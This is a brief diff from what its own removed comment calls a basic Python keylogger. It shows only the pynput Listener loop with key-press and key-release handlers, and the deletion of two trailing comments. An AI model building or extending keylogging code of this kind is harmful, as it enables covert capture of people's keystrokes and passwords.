@@ -33,6 +33,3 @@ def key_release(key):
 
 with Listener(on_press=key_press, on_release=key_release) as listener:
     listener.join()
-
-#this is only a basic keylogger
-#hello
